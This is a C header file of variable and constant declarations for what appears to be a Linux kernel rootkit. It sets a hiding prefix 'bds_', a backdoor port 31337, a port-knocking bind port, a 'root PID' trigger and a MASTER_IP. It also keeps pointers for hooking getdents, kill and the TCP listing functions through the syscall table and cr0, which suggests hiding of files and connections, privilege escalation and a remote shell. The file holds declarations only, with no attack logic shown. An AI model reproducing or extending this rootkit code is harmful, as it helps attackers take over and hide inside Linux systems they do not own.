#ifndef _bds_vars_H_
#define _bds_vars_H_

	#define BDS_PREFIX "bds_"
	#define BDS_PORT "31337"
	#define BDS_ROOT_PID "000"
	#define BDS_BIND_KNOCKING_PORT "1338"
        
	typedef asmlinkage int (*t_syscall)(const struct pt_regs *);
	static t_syscall orig_getdents;
	static t_syscall orig_getdents64;
	static t_syscall orig_kill;
        
	static asmlinkage int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
	static asmlinkage int (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
	
	unsigned long cr0;
	static unsigned long *sys_call_table;
	static struct nf_hook_ops *nfho = NULL;
	struct cred *cred;
	char *kpathname;
	char *kfilename;
	static struct work_struct do_umode_exec;
        static struct work_struct do_work_bind;
        
	int err, ret;
	char *MASTER_IP = NULL;
	static char* envp[] =  {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
	#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 11, 0)
	#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
	#endif
		
#endif
